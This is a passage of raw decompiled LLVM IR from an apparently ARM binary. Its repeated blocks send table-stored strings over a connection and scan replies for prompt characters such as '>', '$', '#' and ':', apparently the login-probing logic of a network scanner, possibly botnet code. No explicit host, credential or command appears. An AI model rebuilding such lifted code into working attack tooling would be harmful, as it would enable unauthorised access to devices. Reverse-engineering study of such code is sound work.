  %v1_11af8 = call i32 @function_1236c(i32 21)
  store i32 %v2_11b00, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_11b08 = call i32 @function_12288(i32 21, i32* nonnull %stack_var_-56)
  store i32 %v3_11b08, i32* %r0.global-to-local, align 4
  %v3_11b0c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11b0c, i32* %r2.global-to-local, align 4
  store i32 %v3_11b08, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11b18 = load i32, i32* @r5, align 4
  %v1_11b18 = add i32 %v0_11b18, 4
  %v2_11b18 = inttoptr i32 %v1_11b18 to i32*
  %v3_11b18 = load i32, i32* %v2_11b18, align 4
  store i32 %v3_11b18, i32* %r0.global-to-local, align 4
  %v4_11b1c = inttoptr i32 %v3_11b08 to i32*
  %v5_11b1c = call i32 @function_13ec0(i32 %v3_11b18, i32* %v4_11b1c, i32 %v3_11b0c, i32 16384)
  store i32 %v5_11b1c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11b2c = load i32, i32* @r5, align 4
  %v1_11b2c = add i32 %v0_11b2c, 4
  %v2_11b2c = inttoptr i32 %v1_11b2c to i32*
  %v3_11b2c = load i32, i32* %v2_11b2c, align 4
  store i32 %v3_11b2c, i32* %r0.global-to-local, align 4
  %v5_11b30 = call i32 @function_13ec0(i32 %v3_11b2c, i32* bitcast ([3 x i8]* @global_var_15f10.34 to i32*), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_11b38 = call i32 @function_122b4(i32 21)
  store i32 %v1_11b38, i32* %r0.global-to-local, align 4
  %v0_11b3c = load i32, i32* @r5, align 4
  %v1_11b3c = add i32 %v0_11b3c, 24
  %v2_11b3c = inttoptr i32 %v1_11b3c to i32*
  %v3_11b3c = load i32, i32* %v2_11b3c, align 4
  store i32 %v3_11b3c, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_11b44 = add i32 %v0_11b3c, 12
  %v3_11b44 = inttoptr i32 %v2_11b44 to i32*
  store i32 6, i32* %v3_11b44, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11b4c:                               ; preds = %dec_label_pc_11750
  %v1_11b4c = add i32 %v0_11750, 24
  %v2_11b4c = inttoptr i32 %v1_11b4c to i32*
  %v3_11b4c = load i32, i32* %v2_11b4c, align 4
  store i32 %v3_11b4c, i32* %ip.global-to-local, align 4
  %v1_11b50 = add i32 %v3_11b4c, -1
  store i32 %v1_11b50, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11b54 = icmp eq i32 %v1_11b50, 0
  store i1 %v2_11b54, i1* %cpsr_z.global-to-local, align 1
  %v5_11b58 = icmp sgt i32 %v1_11b50, 0
  br i1 %v5_11b58, label %dec_label_pc_11b80, label %dec_label_pc_116d0thread-pre-split.thread

dec_label_pc_11b60:                               ; preds = %bb326
  %v2_11b60 = icmp ugt i8 %v3_11b84, 35
  store i1 %v2_11b60, i1* %cpsr_c.global-to-local, align 1
  %v7_11b60 = icmp eq i8 %v3_11b84, 36
  store i1 %v7_11b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b60, label %dec_label_pc_11b94, label %dec_label_pc_11b68

dec_label_pc_11b68:                               ; preds = %dec_label_pc_11b60
  %v2_11b68 = icmp ugt i8 %v3_11b84, 34
  store i1 %v2_11b68, i1* %cpsr_c.global-to-local, align 1
  %v7_11b68 = icmp eq i8 %v3_11b84, 35
  store i1 %v7_11b68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b68, label %dec_label_pc_11b94, label %dec_label_pc_11b70

dec_label_pc_11b70:                               ; preds = %dec_label_pc_11b68
  %v2_11b70 = icmp ugt i8 %v3_11b84, 36
  store i1 %v2_11b70, i1* %cpsr_c.global-to-local, align 1
  %v7_11b70 = icmp eq i8 %v3_11b84, 37
  store i1 %v7_11b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b70, label %dec_label_pc_11b94, label %dec_label_pc_11b78

dec_label_pc_11b78:                               ; preds = %dec_label_pc_11b70
  %v1_11b78 = add i32 %v0_11b94, -1
  store i32 %v1_11b78, i32* %r0.global-to-local, align 4
  %v2_11b78 = icmp ne i32 %v0_11b94, 0
  store i1 %v2_11b78, i1* %cpsr_c.global-to-local, align 1
  %v7_11b78 = icmp eq i32 %v0_11b94, 1
  store i1 %v7_11b78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b78, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11b80

dec_label_pc_11b80:                               ; preds = %dec_label_pc_11b4c, %dec_label_pc_11b78
  %v0_11b94 = phi i32 [ %v1_11b78, %dec_label_pc_11b78 ], [ %v1_11b50, %dec_label_pc_11b4c ]
  %v2_11b80 = add i32 %v0_11b94, %v0_11750
  store i32 %v2_11b80, i32* %r3.global-to-local, align 4
  %v1_11b84 = add i32 %v2_11b80, 28
  %v2_11b84 = inttoptr i32 %v1_11b84 to i8*
  %v3_11b84 = load i8, i8* %v2_11b84, align 1
  %v4_11b84 = zext i8 %v3_11b84 to i32
  store i32 %v4_11b84, i32* %r3.global-to-local, align 4
  %v2_11b88 = icmp ugt i8 %v3_11b84, 61
  store i1 %v2_11b88, i1* %cpsr_c.global-to-local, align 1
  %v7_11b88 = icmp eq i8 %v3_11b84, 62
  store i1 %v7_11b88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b88, label %dec_label_pc_11b94, label %bb326

bb326:                                            ; preds = %dec_label_pc_11b80
  %v3_11b8c = icmp ugt i8 %v3_11b84, 57
  store i1 %v3_11b8c, i1* %cpsr_c.global-to-local, align 1
  %v8_11b8c = icmp eq i8 %v3_11b84, 58
  store i1 %v8_11b8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11b8c, label %dec_label_pc_11b94, label %dec_label_pc_11b60

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11b80, %bb326, %dec_label_pc_11b70, %dec_label_pc_11b68, %dec_label_pc_11b60
  %v1_11b94 = add i32 %v0_11b94, 1
  store i32 %v1_11b94, i32* @r7, align 4
  %v2_11b98 = icmp eq i32 %v1_11b94, -1
  store i1 %v2_11b98, i1* %cpsr_c.global-to-local, align 1
  %v7_11b98 = icmp eq i32 %v0_11b94, -2
  store i1 %v7_11b98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b98, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11ba0

dec_label_pc_11ba0:                               ; preds = %dec_label_pc_11b94
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11ba0 = icmp eq i32 %v1_11b94, 0
  store i1 %v2_11ba0, i1* %cpsr_z.global-to-local, align 1
  %tmp327 = icmp slt i32 %v1_11b94, 1
  br i1 %tmp327, label %dec_label_pc_11860, label %dec_label_pc_11ba8

dec_label_pc_11ba8:                               ; preds = %dec_label_pc_11ba0
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_11bac = call i32 @function_1236c(i32 22)
  store i32 %v2_11bb4, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_11bbc = call i32 @function_12288(i32 22, i32* nonnull %stack_var_-48)
  store i32 %v3_11bbc, i32* %r0.global-to-local, align 4
  %v3_11bc0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_11bc0, i32* %r2.global-to-local, align 4
  store i32 %v3_11bbc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11bcc = load i32, i32* @r5, align 4
  %v1_11bcc = add i32 %v0_11bcc, 4
  %v2_11bcc = inttoptr i32 %v1_11bcc to i32*
  %v3_11bcc = load i32, i32* %v2_11bcc, align 4
  store i32 %v3_11bcc, i32* %r0.global-to-local, align 4
  %v4_11bd0 = inttoptr i32 %v3_11bbc to i32*
  %v5_11bd0 = call i32 @function_13ec0(i32 %v3_11bcc, i32* %v4_11bd0, i32 %v3_11bc0, i32 16384)
  store i32 %v5_11bd0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11be0 = load i32, i32* @r5, align 4
  %v1_11be0 = add i32 %v0_11be0, 4
  %v2_11be0 = inttoptr i32 %v1_11be0 to i32*
  %v3_11be0 = load i32, i32* %v2_11be0, align 4
  store i32 %v3_11be0, i32* %r0.global-to-local, align 4
  %v5_11be4 = call i32 @function_13ec0(i32 %v3_11be0, i32* bitcast ([3 x i8]* @global_var_15f10.34 to i32*), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_11bec = call i32 @function_122b4(i32 22)
  store i32 %v1_11bec, i32* %r0.global-to-local, align 4
  %v0_11bf0 = load i32, i32* @r5, align 4
  %v1_11bf0 = add i32 %v0_11bf0, 24
  %v2_11bf0 = inttoptr i32 %v1_11bf0 to i32*
  %v3_11bf0 = load i32, i32* %v2_11bf0, align 4
  store i32 %v3_11bf0, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v2_11bf8 = add i32 %v0_11bf0, 12
  %v3_11bf8 = inttoptr i32 %v2_11bf8 to i32*
  store i32 7, i32* %v3_11bf8, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11c00:                               ; preds = %dec_label_pc_11750
  %v1_11c00 = add i32 %v0_11750, 24
  %v2_11c00 = inttoptr i32 %v1_11c00 to i32*
  %v3_11c00 = load i32, i32* %v2_11c00, align 4
  store i32 %v3_11c00, i32* %ip.global-to-local, align 4
  %v1_11c04 = add i32 %v3_11c00, -1
  store i32 %v1_11c04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11c08 = icmp eq i32 %v1_11c04, 0
  store i1 %v2_11c08, i1* %cpsr_z.global-to-local, align 1
  %v5_11c0c = icmp sgt i32 %v1_11c04, 0
  br i1 %v5_11c0c, label %dec_label_pc_11c34, label %dec_label_pc_116d0thread-pre-split.thread

dec_label_pc_11c14:                               ; preds = %bb328
  %v2_11c14 = icmp ugt i8 %v3_11c38, 35
  store i1 %v2_11c14, i1* %cpsr_c.global-to-local, align 1
  %v7_11c14 = icmp eq i8 %v3_11c38, 36
  store i1 %v7_11c14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c14, label %dec_label_pc_11c48, label %dec_label_pc_11c1c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c14
  %v2_11c1c = icmp ugt i8 %v3_11c38, 34
  store i1 %v2_11c1c, i1* %cpsr_c.global-to-local, align 1
  %v7_11c1c = icmp eq i8 %v3_11c38, 35
  store i1 %v7_11c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c1c, label %dec_label_pc_11c48, label %dec_label_pc_11c24

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c1c
  %v2_11c24 = icmp ugt i8 %v3_11c38, 36
  store i1 %v2_11c24, i1* %cpsr_c.global-to-local, align 1
  %v7_11c24 = icmp eq i8 %v3_11c38, 37
  store i1 %v7_11c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c24, label %dec_label_pc_11c48, label %dec_label_pc_11c2c

dec_label_pc_11c2c:                               ; preds = %dec_label_pc_11c24
  %v1_11c2c = add i32 %v0_11c48, -1
  store i32 %v1_11c2c, i32* %r0.global-to-local, align 4
  %v2_11c2c = icmp ne i32 %v0_11c48, 0
  store i1 %v2_11c2c, i1* %cpsr_c.global-to-local, align 1
  %v7_11c2c = icmp eq i32 %v0_11c48, 1
  store i1 %v7_11c2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c2c, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11c34

dec_label_pc_11c34:                               ; preds = %dec_label_pc_11c00, %dec_label_pc_11c2c
  %v0_11c48 = phi i32 [ %v1_11c2c, %dec_label_pc_11c2c ], [ %v1_11c04, %dec_label_pc_11c00 ]
  %v2_11c34 = add i32 %v0_11c48, %v0_11750
  store i32 %v2_11c34, i32* %r3.global-to-local, align 4
  %v1_11c38 = add i32 %v2_11c34, 28
  %v2_11c38 = inttoptr i32 %v1_11c38 to i8*
  %v3_11c38 = load i8, i8* %v2_11c38, align 1
  %v4_11c38 = zext i8 %v3_11c38 to i32
  store i32 %v4_11c38, i32* %r3.global-to-local, align 4
  %v2_11c3c = icmp ugt i8 %v3_11c38, 61
  store i1 %v2_11c3c, i1* %cpsr_c.global-to-local, align 1
  %v7_11c3c = icmp eq i8 %v3_11c38, 62
  store i1 %v7_11c3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c3c, label %dec_label_pc_11c48, label %bb328

bb328:                                            ; preds = %dec_label_pc_11c34
  %v3_11c40 = icmp ugt i8 %v3_11c38, 57
  store i1 %v3_11c40, i1* %cpsr_c.global-to-local, align 1
  %v8_11c40 = icmp eq i8 %v3_11c38, 58
  store i1 %v8_11c40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11c40, label %dec_label_pc_11c48, label %dec_label_pc_11c14

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c34, %bb328, %dec_label_pc_11c24, %dec_label_pc_11c1c, %dec_label_pc_11c14
  %v1_11c48 = add i32 %v0_11c48, 1
  store i32 %v1_11c48, i32* @r7, align 4
  %v2_11c4c = icmp eq i32 %v1_11c48, -1
  store i1 %v2_11c4c, i1* %cpsr_c.global-to-local, align 1
  %v7_11c4c = icmp eq i32 %v0_11c48, -2
  store i1 %v7_11c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11c4c, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11c54

dec_label_pc_11c54:                               ; preds = %dec_label_pc_11c48
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11c54 = icmp eq i32 %v1_11c48, 0
  store i1 %v2_11c54, i1* %cpsr_z.global-to-local, align 1
  %tmp329 = icmp slt i32 %v1_11c48, 1
  br i1 %tmp329, label %dec_label_pc_11860, label %dec_label_pc_11c5c

dec_label_pc_11c5c:                               ; preds = %dec_label_pc_11c54
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_11c60 = call i32 @function_1236c(i32 23)
  store i32 %v2_11b00, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_11c70 = call i32 @function_12288(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v3_11c70, i32* %r0.global-to-local, align 4
  %v3_11c74 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11c74, i32* %r2.global-to-local, align 4
  store i32 %v3_11c70, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11c80 = load i32, i32* @r5, align 4
  %v1_11c80 = add i32 %v0_11c80, 4
  %v2_11c80 = inttoptr i32 %v1_11c80 to i32*
  %v3_11c80 = load i32, i32* %v2_11c80, align 4
  store i32 %v3_11c80, i32* %r0.global-to-local, align 4
  %v4_11c84 = inttoptr i32 %v3_11c70 to i32*
  %v5_11c84 = call i32 @function_13ec0(i32 %v3_11c80, i32* %v4_11c84, i32 %v3_11c74, i32 16384)
  store i32 %v5_11c84, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11c94 = load i32, i32* @r5, align 4
  %v1_11c94 = add i32 %v0_11c94, 4
  %v2_11c94 = inttoptr i32 %v1_11c94 to i32*
  %v3_11c94 = load i32, i32* %v2_11c94, align 4
  store i32 %v3_11c94, i32* %r0.global-to-local, align 4
  %v5_11c98 = call i32 @function_13ec0(i32 %v3_11c94, i32* bitcast ([3 x i8]* @global_var_15f10.34 to i32*), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_11ca0 = call i32 @function_122b4(i32 23)
  store i32 %v1_11ca0, i32* %r0.global-to-local, align 4
  %v0_11ca4 = load i32, i32* @r5, align 4
  %v1_11ca4 = add i32 %v0_11ca4, 24
  %v2_11ca4 = inttoptr i32 %v1_11ca4 to i32*
  %v3_11ca4 = load i32, i32* %v2_11ca4, align 4
  store i32 %v3_11ca4, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_11cac = add i32 %v0_11ca4, 12
  %v3_11cac = inttoptr i32 %v2_11cac to i32*
  store i32 9, i32* %v3_11cac, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11cb4:                               ; preds = %dec_label_pc_11750
  %v1_11cb4 = add i32 %v0_11750, 24
  %v2_11cb4 = inttoptr i32 %v1_11cb4 to i32*
  %v3_11cb4 = load i32, i32* %v2_11cb4, align 4
  store i32 %v3_11cb4, i32* %ip.global-to-local, align 4
  %v1_11cb8 = add i32 %v3_11cb4, -1
  store i32 %v1_11cb8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11cbc = icmp eq i32 %v1_11cb8, 0
  store i1 %v2_11cbc, i1* %cpsr_z.global-to-local, align 1
  %v5_11cc0 = icmp sgt i32 %v1_11cb8, 0
  br i1 %v5_11cc0, label %dec_label_pc_11ce8, label %dec_label_pc_116d0thread-pre-split.thread

dec_label_pc_11cc8:                               ; preds = %bb330
  %v2_11cc8 = icmp ugt i8 %v3_11cec, 35
  store i1 %v2_11cc8, i1* %cpsr_c.global-to-local, align 1
  %v7_11cc8 = icmp eq i8 %v3_11cec, 36
  store i1 %v7_11cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11cc8, label %dec_label_pc_11cfc, label %dec_label_pc_11cd0

dec_label_pc_11cd0:                               ; preds = %dec_label_pc_11cc8
  %v2_11cd0 = icmp ugt i8 %v3_11cec, 34
  store i1 %v2_11cd0, i1* %cpsr_c.global-to-local, align 1
  %v7_11cd0 = icmp eq i8 %v3_11cec, 35
  store i1 %v7_11cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11cd0, label %dec_label_pc_11cfc, label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %dec_label_pc_11cd0
  %v2_11cd8 = icmp ugt i8 %v3_11cec, 36
  store i1 %v2_11cd8, i1* %cpsr_c.global-to-local, align 1
  %v7_11cd8 = icmp eq i8 %v3_11cec, 37
  store i1 %v7_11cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11cd8, label %dec_label_pc_11cfc, label %dec_label_pc_11ce0

dec_label_pc_11ce0:                               ; preds = %dec_label_pc_11cd8
  %v1_11ce0 = add i32 %v0_11cfc, -1
  store i32 %v1_11ce0, i32* %r0.global-to-local, align 4
  %v2_11ce0 = icmp ne i32 %v0_11cfc, 0
  store i1 %v2_11ce0, i1* %cpsr_c.global-to-local, align 1
  %v7_11ce0 = icmp eq i32 %v0_11cfc, 1
  store i1 %v7_11ce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ce0, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11cb4, %dec_label_pc_11ce0
  %v0_11cfc = phi i32 [ %v1_11ce0, %dec_label_pc_11ce0 ], [ %v1_11cb8, %dec_label_pc_11cb4 ]
  %v2_11ce8 = add i32 %v0_11cfc, %v0_11750
  store i32 %v2_11ce8, i32* %r3.global-to-local, align 4
  %v1_11cec = add i32 %v2_11ce8, 28
  %v2_11cec = inttoptr i32 %v1_11cec to i8*
  %v3_11cec = load i8, i8* %v2_11cec, align 1
  %v4_11cec = zext i8 %v3_11cec to i32
  store i32 %v4_11cec, i32* %r3.global-to-local, align 4
  %v2_11cf0 = icmp ugt i8 %v3_11cec, 61
  store i1 %v2_11cf0, i1* %cpsr_c.global-to-local, align 1
  %v7_11cf0 = icmp eq i8 %v3_11cec, 62
  store i1 %v7_11cf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11cf0, label %dec_label_pc_11cfc, label %bb330

bb330:                                            ; preds = %dec_label_pc_11ce8
  %v3_11cf4 = icmp ugt i8 %v3_11cec, 57
  store i1 %v3_11cf4, i1* %cpsr_c.global-to-local, align 1
  %v8_11cf4 = icmp eq i8 %v3_11cec, 58
  store i1 %v8_11cf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11cf4, label %dec_label_pc_11cfc, label %dec_label_pc_11cc8

dec_label_pc_11cfc:                               ; preds = %dec_label_pc_11ce8, %bb330, %dec_label_pc_11cd8, %dec_label_pc_11cd0, %dec_label_pc_11cc8
  %v1_11cfc = add i32 %v0_11cfc, 1
  store i32 %v1_11cfc, i32* @r7, align 4
  %v2_11d00 = icmp eq i32 %v1_11cfc, -1
  store i1 %v2_11d00, i1* %cpsr_c.global-to-local, align 1
  %v7_11d00 = icmp eq i32 %v0_11cfc, -2
  store i1 %v7_11d00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d00, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11d08

dec_label_pc_11d08:                               ; preds = %dec_label_pc_11cfc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11d08 = icmp eq i32 %v1_11cfc, 0
  store i1 %v2_11d08, i1* %cpsr_z.global-to-local, align 1
  %tmp331 = icmp slt i32 %v1_11cfc, 1
  br i1 %tmp331, label %dec_label_pc_11860, label %dec_label_pc_11d10

dec_label_pc_11d10:                               ; preds = %dec_label_pc_11d08
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_11d14 = call i32 @function_1236c(i32 20)
  store i32 %v2_11bb4, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_11d24 = call i32 @function_12288(i32 20, i32* nonnull %stack_var_-48)
  store i32 %v3_11d24, i32* %r0.global-to-local, align 4
  %v3_11d28 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_11d28, i32* %r2.global-to-local, align 4
  store i32 %v3_11d24, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11d34 = load i32, i32* @r5, align 4
  %v1_11d34 = add i32 %v0_11d34, 4
  %v2_11d34 = inttoptr i32 %v1_11d34 to i32*
  %v3_11d34 = load i32, i32* %v2_11d34, align 4
  store i32 %v3_11d34, i32* %r0.global-to-local, align 4
  %v4_11d38 = inttoptr i32 %v3_11d24 to i32*
  %v5_11d38 = call i32 @function_13ec0(i32 %v3_11d34, i32* %v4_11d38, i32 %v3_11d28, i32 16384)
  store i32 %v5_11d38, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11d48 = load i32, i32* @r5, align 4
  %v1_11d48 = add i32 %v0_11d48, 4
  %v2_11d48 = inttoptr i32 %v1_11d48 to i32*
  %v3_11d48 = load i32, i32* %v2_11d48, align 4
  store i32 %v3_11d48, i32* %r0.global-to-local, align 4
  %v5_11d4c = call i32 @function_13ec0(i32 %v3_11d48, i32* bitcast ([3 x i8]* @global_var_15f10.34 to i32*), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_11d54 = call i32 @function_122b4(i32 20)
  store i32 %v1_11d54, i32* %r0.global-to-local, align 4
  %v0_11d58 = load i32, i32* @r5, align 4
  %v1_11d58 = add i32 %v0_11d58, 24
  %v2_11d58 = inttoptr i32 %v1_11d58 to i32*
  %v3_11d58 = load i32, i32* %v2_11d58, align 4
  store i32 %v3_11d58, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_11d60 = add i32 %v0_11d58, 12
  %v3_11d60 = inttoptr i32 %v2_11d60 to i32*
  store i32 8, i32* %v3_11d60, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11d68:                               ; preds = %dec_label_pc_11750
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11d6c = call i32 @function_1236c(i32 26)
  store i32 %v2_11b00, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_11d7c = call i32 @function_12288(i32 26, i32* nonnull %stack_var_-56)
  %v3_11d80 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11d7c, i32* %r2.global-to-local, align 4
  %v1_11d88 = add i32 %v3_11d80, -1
  store i32 %v1_11d88, i32* %r3.global-to-local, align 4
  %v0_11d8c = load i32, i32* @sb, align 4
  store i32 %v0_11d8c, i32* %r0.global-to-local, align 4
  %v0_11d90 = load i32, i32* @r5, align 4
  %v1_11d90 = add i32 %v0_11d90, 24
  %v2_11d90 = inttoptr i32 %v1_11d90 to i32*
  %v3_11d90 = load i32, i32* %v2_11d90, align 4
  store i32 %v3_11d90, i32* %r1.global-to-local, align 4
  %v4_11d94 = call i32 @function_12d58(i32 %v0_11d8c, i32 %v3_11d90, i32 %v3_11d7c, i32 %v1_11d88)
  %v3_11d98 = icmp eq i32 %v4_11d94, -1
  store i1 %v3_11d98, i1* %cpsr_c.global-to-local, align 1
  %v8_11d98 = icmp eq i32 %v4_11d94, -1
  store i1 %v8_11d98, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_11da4 = call i32 @function_122b4(i32 26)
  br i1 %v3_11d98, label %dec_label_pc_11da0, label %dec_label_pc_11fd4

dec_label_pc_11da0:                               ; preds = %dec_label_pc_11d68
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11dac = call i32 @function_1236c(i32 25)
  store i32 %v2_11b00, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_11dbc = call i32 @function_12288(i32 25, i32* nonnull %stack_var_-56)
  store i32 %v3_11dbc, i32* %r0.global-to-local, align 4
  %v3_11dc0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11dbc, i32* %r2.global-to-local, align 4
  %v1_11dc8 = add i32 %v3_11dc0, -1
  store i32 %v1_11dc8, i32* %r3.global-to-local, align 4
  %v0_11dcc = load i32, i32* @r5, align 4
  %v1_11dcc = add i32 %v0_11dcc, 24
  %v2_11dcc = inttoptr i32 %v1_11dcc to i32*
  %v3_11dcc = load i32, i32* %v2_11dcc, align 4
  store i32 %v3_11dcc, i32* %r1.global-to-local, align 4
  %v0_11dd0 = load i32, i32* @sb, align 4
  store i32 %v0_11dd0, i32* %r0.global-to-local, align 4
  %v4_11dd4 = call i32 @function_12d58(i32 %v0_11dd0, i32 %v3_11dcc, i32 %v3_11dbc, i32 %v1_11dc8)
  store i32 %v4_11dd4, i32* @r7, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11de0 = call i32 @function_122b4(i32 25)
  store i32 %v1_11de0, i32* %r0.global-to-local, align 4
  %v0_11de4 = load i32, i32* @r7, align 4
  %v2_11de4 = icmp eq i32 %v0_11de4, -1
  store i1 %v2_11de4, i1* %cpsr_c.global-to-local, align 1
  %v7_11de4 = icmp eq i32 %v0_11de4, -1
  store i1 %v7_11de4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11de4, label %dec_label_pc_116cc.loopexit, label %dec_label_pc_11dec

dec_label_pc_11dec:                               ; preds = %dec_label_pc_11da0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11dec = icmp eq i32 %v0_11de4, 0
  store i1 %v2_11dec, i1* %cpsr_z.global-to-local, align 1
  %tmp332 = icmp slt i32 %v0_11de4, 1
  br i1 %tmp332, label %dec_label_pc_11860, label %dec_label_pc_11df4

dec_label_pc_11df4:                               ; preds = %dec_label_pc_11dec
  %v0_11df4 = load i32, i32* @r5, align 4
  %v1_11df4 = add i32 %v0_11df4, 21
  %v2_11df4 = inttoptr i32 %v1_11df4 to i8*
  %v3_11df4 = load i8, i8* %v2_11df4, align 1
  %v4_11df4 = zext i8 %v3_11df4 to i32
  store i32 %v4_11df4, i32* %r3.global-to-local, align 4
  %v1_11df8 = add i32 %v0_11df4, 20
  %v2_11df8 = inttoptr i32 %v1_11df8 to i8*
  %v3_11df8 = load i8, i8* %v2_11df8, align 1
  %v4_11df8 = zext i8 %v3_11df8 to i32
  store i32 %v4_11df8, i32* %r2.global-to-local, align 4
  %v1_11dfc = add i32 %v0_11df4, 16
  %v2_11dfc = inttoptr i32 %v1_11dfc to i32*
  %v3_11dfc = load i32, i32* %v2_11dfc, align 4
  store i32 %v3_11dfc, i32* %r1.global-to-local, align 4
  %v4_11e00 = mul nuw nsw i32 %v4_11df4, 256
  %v5_11e00 = or i32 %v4_11df8, %v4_11e00
  store i32 %v5_11e00, i32* %r2.global-to-local, align 4
  %v1_11e04 = and i32 %v4_11df8, 128
  %v2_11e04 = icmp ne i32 %v1_11e04, 0
  store i1 %v2_11e04, i1* %cpsr_c.global-to-local, align 1
  store i32 %v4_11df4, i32* %r3.global-to-local, align 4
  store i32 %v3_11dfc, i32* %stack_var_-48, align 4
  store i32 %v5_11e00, i32* %stack_var_-38, align 4
  %v1_11e14 = inttoptr i32 %v0_11df4 to i32*
  %v2_11e14 = load i32, i32* %v1_11e14, align 4
  store i32 %v2_11e14, i32* @fp, align 4
  %v0_11e18 = call i32 @function_13680()
  store i32 %v0_11e18, i32* %r0.global-to-local, align 4
  %v7_11e1c = icmp eq i32 %v0_11e18, -1
